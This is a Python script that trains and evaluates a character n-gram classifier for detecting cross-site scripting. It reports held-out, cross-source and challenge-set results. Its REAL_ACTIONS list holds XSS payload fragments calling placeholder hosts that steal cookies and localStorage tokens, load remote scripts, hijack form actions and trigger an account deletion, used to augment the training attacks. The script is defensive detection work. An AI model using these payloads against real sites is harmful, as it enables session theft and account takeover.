"""Train and evaluate the XSS detector.

Usage:  python src/train_xss.py [--target-fpr 0.001]

Three evaluations are reported, from most to least flattering:
  1. Held-out test split of the combined data.
  2. Cross-source: train on one public dataset, test on the other.
  3. Challenge set: hand-written inputs in data/challenge/ that are never trained on.
"""
from __future__ import annotations

import argparse
import json
import random
import re
import sys
import time
from pathlib import Path

import joblib
import numpy as np
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import average_precision_score, roc_auc_score
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline

sys.path.insert(0, str(Path(__file__).resolve().parent))
import synthetic  # noqa: E402
from xss_model import WINDOW, score, windows  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
SEED = 42
MAX_BENIGN_WINDOWS = 8

VARIANT_SHARE = 0.35  # share of alert()-style training attacks that also get a realistic variant
_POC_CALL = re.compile(r"(?:alert|prompt|confirm)\s*\([^()]*\)")
REAL_ACTIONS = [  # lowercase, like all normalised text
    "fetch('https://HOST/c?'+document.cookie)",
    "location='https://HOST/?c='+document.cookie",
    "new image().src='//HOST/log?'+document.cookie",
    "eval(atob('zmv0y2goji8vcy5jby8ikq=='))",
    "document.location.href='http://HOST/'",
    "navigator.sendbeacon('https://HOST/b',localstorage.getitem('token'))",
    "import('//HOST/x.js')",
    "document.write('<img src=//HOST/'+document.cookie+'>')",
    "window.open('https://HOST/login')",
    "fetch('/api/account/delete',{method:'post'})",
    "document.forms[0].action='https://HOST/steal'",
    "$.getscript('//HOST/hook.js')",
    "settimeout(function(){location.replace('//HOST')},100)",
    "this.src='https://HOST/?'+btoa(document.body.innerhtml)",
    "top.location='//HOST'",
    "steal()",
    "x()",
]

# For the cross-source test: what may be trained on alongside each public dataset.
# twin_urls is built from mereani's attacks, so it must stay out when mereani is the test set.
TRAIN_WITH = {"mereani": ["mereani", "twin_urls", "synthetic"], "webattacks": ["webattacks", "synthetic"]}


def build_pipeline() -> Pipeline:
    return Pipeline(
        [
            # Character n-grams pick up fragments such as "<scr", "rror=" and "ipt:"
            # wherever they appear, without needing a tokenizer that attackers can dodge.
            ("tfidf", TfidfVectorizer(analyzer="char", ngram_range=(1, 4), min_df=3, sublinear_tf=True, lowercase=False)),
            ("clf", LogisticRegression(C=10, max_iter=2000, class_weight="balanced")),
        ]
    )


def training_chunks(df: pd.DataFrame) -> tuple[list[str], list[int]]:
    """Cut training texts down to the window size the model scores at.

    Long benign texts contribute several windows, so the model also sees the middle
    of large harmless files. Attack samples contribute only their first window: a
    later window may not contain the payload and would be mislabelled.
    """
    texts: list[str] = []
    labels: list[int] = []
    for text, label in zip(df["text"], df["label"]):
        if label == 1 or len(text) <= WINDOW:
            chunks = [text[:WINDOW]]
        else:
            chunks = windows(text)
            if len(chunks) > MAX_BENIGN_WINDOWS:
                picks = np.linspace(0, len(chunks) - 1, MAX_BENIGN_WINDOWS).astype(int)
                chunks = [chunks[i] for i in picks]
        texts.extend(chunks)
        labels.extend([label] * len(chunks))
    return texts, labels


def realistic_variants(attacks: pd.Series) -> list[str]:
    """Copies of some training attacks with the proof-of-concept call swapped for a real action.

    Nearly every dataset payload calls alert(1). Real attacks steal cookies or redirect
    instead, so without this the model leans on "alert(" and underrates `onclick=fetch(...)`.
    Applied to training rows only, so no variant of a test attack leaks into training.
    """
    rng = random.Random(SEED)
    out = []
    for text in attacks:
        if _POC_CALL.search(text) and rng.random() < VARIANT_SHARE:
            host = f"{rng.choice(synthetic.WORDS)}{rng.randint(1, 99)}.{rng.choice(synthetic.TLDS)}"
            action = rng.choice(REAL_ACTIONS).replace("HOST", host)
            out.append(_POC_CALL.sub(lambda _: action, text))
    return out


def fit(df: pd.DataFrame) -> Pipeline:
    texts, labels = training_chunks(df)
    variants = [v[:WINDOW] for v in realistic_variants(df.loc[df["label"] == 1, "text"])]
    return build_pipeline().fit(texts + variants, labels + [1] * len(variants))


def threshold_for_fpr(y: np.ndarray, s: np.ndarray, fpr: float) -> float:
    """Lowest threshold that lets through at most `fpr` of the benign samples."""
    benign = np.sort(s[y == 0])[::-1]
    allowed = int(np.floor(fpr * len(benign)))
    return float(benign[allowed]) if allowed < len(benign) else 0.0


def evaluate(y: np.ndarray, s: np.ndarray, threshold: float) -> dict:
    flagged = s > threshold
    tp, fp = int((flagged & (y == 1)).sum()), int((flagged & (y == 0)).sum())
    fn, tn = int((~flagged & (y == 1)).sum()), int((~flagged & (y == 0)).sum())
    return {
        "samples": int(len(y)),
        "roc_auc": round(float(roc_auc_score(y, s)), 5),
        "pr_auc": round(float(average_precision_score(y, s)), 5),
        "detection_at_1pct_false_alarms": round(float((s[y == 1] > threshold_for_fpr(y, s, 0.01)).mean()), 4),
        "detection_at_0.1pct_false_alarms": round(float((s[y == 1] > threshold_for_fpr(y, s, 0.001)).mean()), 4),
        "threshold": round(threshold, 4),
        "detection_rate": round(tp / max(tp + fn, 1), 4),
        "false_alarm_rate": round(fp / max(fp + tn, 1), 4),
        "precision": round(tp / max(tp + fp, 1), 4),
        "confusion": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
    }


def show(title: str, m: dict) -> None:
    c = m["confusion"]
    print(f"\n{title}  ({m['samples']} samples)")
    print(f"  ROC AUC {m['roc_auc']:.4f} | PR AUC {m['pr_auc']:.4f}")
    print(f"  detection at 1% false alarms:   {m['detection_at_1pct_false_alarms']:.1%}")
    print(f"  detection at 0.1% false alarms: {m['detection_at_0.1pct_false_alarms']:.1%}")
    print(
        f"  at threshold {m['threshold']:.3f}: detection {m['detection_rate']:.1%}, "
        f"false alarms {m['false_alarm_rate']:.2%}, precision {m['precision']:.1%} "
        f"(caught {c['tp']}, missed {c['fn']}, false alarms {c['fp']}, correct benign {c['tn']})"
    )


def by_source(test: pd.DataFrame, scores: np.ndarray, threshold: float) -> dict:
    """Detection and false-alarm rate per data source at the chosen threshold."""
    out = {}
    print("\n  per source at that threshold:")
    for source, rows in test.assign(flagged=scores > threshold).groupby("source"):
        attacks, benign = rows[rows["label"] == 1], rows[rows["label"] == 0]
        out[source] = {
            "attacks": len(attacks), "caught": int(attacks["flagged"].sum()),
            "benign": len(benign), "false_alarms": int(benign["flagged"].sum()),
        }
        caught = f"caught {out[source]['caught']}/{len(attacks)} attacks" if len(attacks) else "no attacks"
        print(f"    {source:<11} {caught}, {out[source]['false_alarms']}/{len(benign)} false alarms")
    return out


def challenge(model: Pipeline, threshold: float) -> dict | None:
    """Score the hand-written challenge set and list every mistake."""
    folder = ROOT / "data" / "challenge"
    if not (folder / "attacks.txt").exists():
        return None
    read = lambda name: [line for line in (folder / name).read_text(encoding="utf-8").splitlines() if line.strip()]  # noqa: E731
    attacks, benign = read("attacks.txt"), read("benign.txt")
    attack_scores, benign_scores = score(model, attacks), score(model, benign)
    missed = [(float(s), t) for t, s in zip(attacks, attack_scores) if s <= threshold]
    false_alarms = [(float(s), t) for t, s in zip(benign, benign_scores) if s > threshold]

    print(f"\nChallenge set (hand-written, never trained on) at threshold {threshold:.3f}")
    print(f"  attacks caught: {len(attacks) - len(missed)}/{len(attacks)}")
    for s, text in missed:
        print(f"    missed       {s:.3f}  {text[:90]}")
    print(f"  false alarms:   {len(false_alarms)}/{len(benign)}")
    for s, text in false_alarms:
        print(f"    false alarm  {s:.3f}  {text[:90]}")
    return {
        "attacks": len(attacks), "caught": len(attacks) - len(missed), "missed": [t for _, t in missed],
        "benign": len(benign), "false_alarms": [t for _, t in false_alarms],
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--data", type=Path, default=ROOT / "data" / "processed" / "xss.csv")
    parser.add_argument("--out", type=Path, default=ROOT / "models" / "xss_model.joblib")
    parser.add_argument("--target-fpr", type=float, default=0.001, help="false-alarm rate the threshold is tuned for")
    args = parser.parse_args()

    df = pd.read_csv(args.data, keep_default_na=False)
    df["text"] = df["text"].astype(str)
    strata = df["source"] + df["label"].astype(str)
    train, rest = train_test_split(df, test_size=0.30, stratify=strata, random_state=SEED)
    val, test = train_test_split(rest, test_size=0.50, stratify=strata[rest.index], random_state=SEED)
    print(f"train {len(train)} | validation {len(val)} | test {len(test)}")

    start = time.time()
    model = fit(train)
    print(f"trained in {time.time() - start:.0f}s, {len(model.named_steps['tfidf'].vocabulary_)} features")

    # Tune the threshold on validation data, never on the test set. It is not allowed
    # below 0.5: a tiny threshold fits this data but over-reacts to unfamiliar input.
    val_scores = score(model, val["text"].tolist(), normalized=True)
    threshold = max(0.5, threshold_for_fpr(val["label"].to_numpy(), val_scores, args.target_fpr))

    metrics = {"threshold": threshold, "target_fpr": args.target_fpr}
    test_scores = score(model, test["text"].tolist(), normalized=True)
    metrics["held_out_test"] = evaluate(test["label"].to_numpy(), test_scores, threshold)
    show("Held-out test split", metrics["held_out_test"])
    metrics["held_out_test"]["by_source"] = by_source(test, test_scores, threshold)

    for train_source, allowed in TRAIN_WITH.items():
        for test_source in TRAIN_WITH:
            if test_source == train_source or not {train_source, test_source} <= set(df["source"]):
                continue
            other = df[df["source"] == test_source]
            cross_model = fit(df[df["source"].isin(allowed)])
            cross_scores = score(cross_model, other["text"].tolist(), normalized=True)
            key = f"train_{train_source}_test_{test_source}"
            metrics[key] = evaluate(other["label"].to_numpy(), cross_scores, 0.5)
            show(f"Cross-source: trained on {train_source}, tested on {test_source}", metrics[key])

    metrics["challenge_set"] = challenge(model, threshold)

    args.out.parent.mkdir(parents=True, exist_ok=True)
    joblib.dump({"pipeline": model, "threshold": threshold}, args.out)
    metrics_path = args.out.with_name("xss_metrics.json")
    metrics_path.write_text(json.dumps(metrics, indent=2), encoding="utf-8")
    print(f"\nsaved {args.out.relative_to(ROOT)} and {metrics_path.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
